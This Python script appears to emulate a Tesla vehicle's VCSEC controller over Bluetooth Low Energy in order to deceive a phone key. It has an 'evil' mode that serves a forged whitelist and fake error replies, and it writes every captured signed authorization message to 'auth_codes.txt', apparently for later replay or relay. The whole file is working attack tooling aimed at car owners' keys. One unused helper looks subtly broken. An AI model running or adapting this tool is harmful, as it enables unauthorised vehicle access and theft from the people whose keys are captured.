from pybleno.hci_socket import Emit
import VCSEC_pb2 as VCSEC
from google.protobuf.json_format import MessageToJson
from google.protobuf.text_format import MessageToString

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def getCommandStatusConfirmation(cnt):
    msgStatus = VCSEC.SignedMessage_status(counter=cnt)
    cmdStatus = VCSEC.CommandStatus(signedMessageStatus=msgStatus) 
    fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
    return fromVcsecMsg

def getCommandStatusError(cnt):
    msgStatus = VCSEC.SignedMessage_status(counter=cnt,signedMessageInformation=VCSEC.SIGNEDMESSAGE_INFORMATION_FAULT_NOT_ON_WHITELIST)
    cmdStatus = VCSEC.CommandStatus(operationStatus=VCSEC.OPERATIONSTATUS_ERROR,signedMessageStatus=msgStatus) 
    fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
    return fromVcsecMsg

def getAuthorizationRequest(adToken):
    msgStatus = VCSEC.signedMessage_status(counter=adToken,signedMessageInformation=VCSEC.SIGNEDMESSAGE_INFORMATION_FAULT_NOT_ON_WHITELIST)
    cmdStatus = VCSEC.commandStatus(operationStatus=VCSEC.OPERATIONSTATUS_ERROR,signedMessageStatus=msgStatus) 
    fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
    return fromVcsecMsg

def getHexString(messageBytes,strip):
    if (strip==1):
        array = messageBytes[2 : ]
    else:
        array = messageBytes

    return ''.join(format(x, '02x') for x in array)


def getOutputStringTV(messageBytes,human):
    array = messageBytes[2 : ]
    if (human==1):
        temp = VCSEC.ToVCSECMessage()
        temp.ParseFromString(array)
        return (MessageToString(temp, as_utf8=True)+"\n"+''.join(format(x, '02x') for x in array)+"\n")
    else:
        return ''.join(format(x, '02x') for x in array)

def getOutputStringFV(messageBytes,human):
    array = messageBytes[2 : ]
    if (human==1):
        temp = VCSEC.FromVCSECMessage()
        temp.ParseFromString(array)
        return (MessageToString(temp, as_utf8=True)+"\n"+''.join(format(x, '02x') for x in array)+"\n")
    else:
        return ''.join(format(x, '02x') for x in array)

def getPrefix(length):
    return length.to_bytes(2, byteorder='big', signed=False)

def getSerializedMessage(protoMsg):
    messagebytes = protoMsg.SerializeToString()
    prefixbytes = getPrefix(len(messagebytes))
    return prefixbytes + messagebytes

class Tesla():
    def __init__(self,vehicleConfig):
        self.vehicleConfig = vehicleConfig
        self.cryptoCounter=0
        self.messagelist = []
        self.messagelist.append(bytearray.fromhex('00041a021802'))
        self.evil=0
        self.human=1

    def toggleEvilBit(self):
        if (self.evil==0):
            self.evil=1
        else:
            self.evil=0

    def toggleHumanBit(self):
        if (self.human==0):
            self.human=1
        else:
            self.human=0

    def handleMessage(self, data):
        vcsecMessage = VCSEC.ToVCSECMessage()
        vcsecMessage.ParseFromString(data[2 : ]) # strip length header
        if (vcsecMessage.unsignedMessage.HasField("InformationRequest")):
            if (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_WHITELIST_INFO):
                if(self.evil==1):
                    self.messagelist.append(bytearray.fromhex(self.vehicleConfig['evilWhitelist']))
            elif (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_EPHEMERAL_PUBLIC_KEY):
                self.messagelist.append(bytearray.fromhex(self.vehicleConfig['pubkeyResponse']))
            else:
                self.messagelist.append(bytearray.fromhex('00041a021802'))
                self.messagelist.append(bytearray.fromhex('000a0a080a02300310011802'))
        elif (vcsecMessage.HasField("signedMessage")):
            self.cryptoCounter = vcsecMessage.signedMessage.counter
            if (getOutputStringTV(data,1).find("signatureType")>0):
                # save received message to file
                authFile = open("auth_codes.txt","a")
                authFile.write(getHexString(data,0)+"\n")

            if(self.evil==1):
                self.messagelist.append(getSerializedMessage(getCommandStatusError(self.cryptoCounter)))
            else:
                self.messagelist.append(getSerializedMessage(getCommandStatusConfirmation(self.cryptoCounter)))
        pass

Emit.Patch(Tesla)
